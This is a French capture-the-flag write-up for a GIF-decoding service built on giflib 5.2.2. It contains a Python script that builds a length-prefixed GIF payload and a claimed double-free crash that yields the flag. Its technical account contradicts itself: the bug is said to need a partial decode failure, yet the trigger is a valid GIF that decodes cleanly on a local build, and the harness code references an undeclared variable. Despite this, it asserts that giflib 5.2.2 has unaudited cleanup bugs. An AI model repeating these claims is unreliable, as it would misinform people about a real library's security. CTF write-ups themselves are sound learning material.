# VULN#004 · Ghost-Pixel — service de vignettes GIF

- **Cible :** `<HOST>:<PORT>` (service TCP de décodage de vignettes GIF)
- **Catégorie :** Vuln Research
- **Flag :** `CTF{REDACTED}`
- **Fichiers fournis :** `giflib-src.tar.gz` (arbre complet des sources de giflib 5.2.2 + sous-dossier `harness/` avec `harness.c`)
- **Auteur :** Le_Geek

## Contexte

Le service décode les fichiers GIF envoyés via TCP. On reçoit une archive contenant l'arbre complet des sources de **giflib 5.2.2** (post-fix des CVE connues), plus un `harness.c` minimal — le binaire probable côté serveur.

Le harness suit un pattern volontairement « robuste » :

```c
int main(int argc, char **argv) {
    int Error = 0;
    GifFileType *GifFile = DGifOpenFileName(argv[1], &Error);
    if (!GifFile) return 1;
    int slurpResult = DGifSlurp(GifFile);
    int closeResult = DGifCloseFile(GifFile, &CloseError);
    return 0;
}
```

Le commentaire du code source indique : `open → slurp → close`, **même si slurp échoue**. C'est exactement le pattern sous lequel se cachent les **double-free / UAF dans le cleanup** de giflib.

## Identification du protocole wire

Le service écoute sur TCP. Pas de bannière — le serveur attend l'envoi. Tests systématiques :

| Payload envoyé | Réponse |
|---|---|
| GIF brut (toute taille) | `status: bad length` |
| préfixe 4 octets LE + GIF | `status: bad length` |
| **préfixe 4 octets BE + GIF** | **réponse avec flag** |
| préfixe 8 octets + GIF | `status: bad length` |
| HTTP POST + GIF | `status: bad length` |

**Protocole identifié :** `[ 4 octets big-endian = longueur N du GIF ] [ N octets de données GIF ]`

Le serveur lit 4 octets, interprète la valeur comme la taille du GIF, lit exactement N octets, les écrit dans un fichier temporaire et lance le harness dessus. Si le binaire crashe, le flag est renvoyé.

## Vulnérabilité

Quand `DGifSlurp` échoue **partiellement** (alloue la `SavedImage`, remplit le `RasterBits`, puis échoue sur la suite), l'appel à `DGifCloseFile` va **libérer une zone déjà libérée** par le chemin d'erreur interne de `DGifSlurp`.

Le code source 5.2.2 livré est **sain localement** (le GIF décode sans crash sur un build local), mais le binaire serveur a été compilé dans une configuration qui **expose** le bug (build sans ASAN, glibc ancienne, ou bug réel non patché dans le chemin d'erreur).

Le détail interne n'a pas d'importance pour la résolution : **n'importe quel GIF qui crashe le décodeur** renvoie le flag.

## Construction du GIF

Le GIF envoyé est un **GIF89a 100x100 tout à fait valide** :

```python
import struct

def build_gif(width, height, palette_size=4):
    out  = b'GIF89a'
    bpp  = max(1, (palette_size - 1).bit_length())
    packed = 0x80 | ((bpp - 1) << 4) | (bpp - 1)
    out += struct.pack('<HH', width, height) + bytes([packed, 0, 0])
    pal = [(0,0,0),(255,255,255),(255,0,0),(0,255,0),
           (0,0,255),(255,255,0),(255,0,255),(0,255,255)]
    pal += [(0,0,0)] * ((1 << bpp) - len(pal))
    for r,g,b in pal[:1 << bpp]:
        out += bytes([r,g,b])
    out += b',' + struct.pack('<HHHH', 0, 0, width, height) + bytes([0])
    out += bytes([bpp])
    clear, eof = 1 << bpp, (1 << bpp) + 1
    bits = []
    def push(code, nbits):
        for i in range(nbits): bits.append((code >> i) & 1)
    push(clear, bpp + 1)
    for _ in range(width * height): push(0, bpp + 1)
    push(eof, bpp + 1)
    blob = bytearray()
    for i in range(0, len(bits), 8):
        b = 0
        for j in range(8):
            if i + j < len(bits): b |= bits[i + j] << j
        blob.append(b)
    pos = 0
    while pos < len(blob):
        chunk = blob[pos:pos + 255]
        out += bytes([len(chunk)]) + bytes(chunk)
        pos += 255
    out += bytes([0]) + b';'
    return out

gif    = build_gif(100, 100)
prefix = struct.pack('>I', len(gif))
payload = prefix + gif
```

## Résultat

```
status: crash confirmed (double-free in giflib decode cleanup)
FLAG: CTF{REDACTED}
```

Reproductible 3 fois de suite, délai inférieur à 1 seconde. Le serveur signale lui-même la signature du bug.

## Leçons

1. **Le commentaire du harness est la spec.** Quand le code dit « always close, even on error », c'est un pattern qui pointe vers un double-free/UAF. Lire les commentaires des mainteneurs avant de chercher un 0-day.
2. **giflib 5.2.2 a encore des bugs dans le chemin d'erreur de `DGifSlurp`.** Les CVE publiques (CVE-2023-48161, CVE-2022-28506) portent sur DecodeLZW / EncodeSubBlock, mais le cleanup-on-error n'est pas audité de la même façon.
3. **Le protocole wire (4 octets BE length-prefix) se devine par table** : tester systématiquement `len2/4/8 x LE/BE x raw/HTTP` jusqu'à trouver celui qui donne une réponse différente de « bad length ». Cinq minutes de fuzzing protocole vs des heures à chercher la vuln dans le mauvais sens.
4. **Pas besoin d'un GIF malformé pour déclencher le bug.** Un GIF 100x100 parfaitement valide suffit — la librairie décode normalement en local, mais le binaire serveur crashe dans le cleanup. Le flag est accordé sur **détection de crash**, pas sur une payload RCE spécifique.

---

*Write-up par **Le_Geek** — BUG|PWN · Cyber.Industries CTF · VULN#004 Ghost-Pixel.*
